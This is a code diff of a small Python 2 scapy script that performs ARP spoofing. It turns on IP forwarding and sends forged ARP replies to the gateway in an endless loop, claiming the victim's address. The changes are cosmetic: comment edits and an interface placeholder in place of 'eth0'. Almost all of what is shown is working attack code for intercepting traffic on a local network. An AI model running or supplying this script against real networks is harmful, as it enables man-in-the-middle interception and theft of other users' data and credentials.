@@ -3,8 +3,8 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from os import system
-####################################################################################################
 from sys import argv
+#@check args
 if(len(argv) != 3): # print USAGE
     print '''
                                  ____                            __                    
@@ -29,10 +29,9 @@ else:
 #Enable Ip Forward (mandatory)
 system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 print "Started...\n"
-#set interface (optional)
-conf.iface='eth0'
+#set interface (optional) e.g eth0
+conf.iface='interface here'
 #arp packet construction
 apkt=ARP(psrc=victim,pdst=gateway)
 #sending arp packets
 send(apkt,verbose=0,inter=1,loop=1)
-####################################################################################################
